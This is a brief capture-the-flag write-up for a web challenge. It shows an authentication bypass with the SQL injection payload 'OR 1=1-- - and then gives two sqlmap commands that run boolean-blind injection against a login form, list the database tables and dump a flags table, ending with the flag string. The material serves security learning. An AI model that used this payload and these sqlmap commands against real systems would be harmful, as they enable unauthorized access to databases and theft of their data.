After some manual testing I found I could login via `'OR 1=1-- -` and was able to get in... so this is easy sqli problem.

<img width="661" height="358" alt="image" src="https://github.com/user-attachments/assets/5db44e56-6071-43cb-b453-29dc9219b1a2" />

Then I have some connectivity tool, **but this connectivity tool doesn't do anything. we need so this hinted at blind SQLI to dump the db**

<img width="661" height="358" alt="image" src="https://github.com/user-attachments/assets/026601ff-0e91-4fca-8e16-7c572bfa1a0a" />



Use SQL map:

```
sqlmap -u "http://18.212.136.134:9080/login" \
       --data="username=admin&password=test" \
       --technique=B \
       --level=5 \
       --risk=3 \
       --tables \
       --batch
```

<img width="394" height="186" alt="image" src="https://github.com/user-attachments/assets/5198bbdf-d9e1-4abc-9300-06cbe2e8af83" />


We get 3 tables: `users`, `sqlite_sequence`, and `flags`.

Lets dump the `flags` table: and look  what we found:

```
sqlmap -u "http://18.212.136.134:9080/login" \
       --data="username=admin&password=test" \
       --technique=B \
       -T flags \
       --dump \
       --batch
```

<img width="1084" height="369" alt="image" src="https://github.com/user-attachments/assets/e5c43757-1f05-410b-9250-eaba047f5a9a" />

cool we got the flag: `PCTF{C0nn3cti0n_S3cured}`
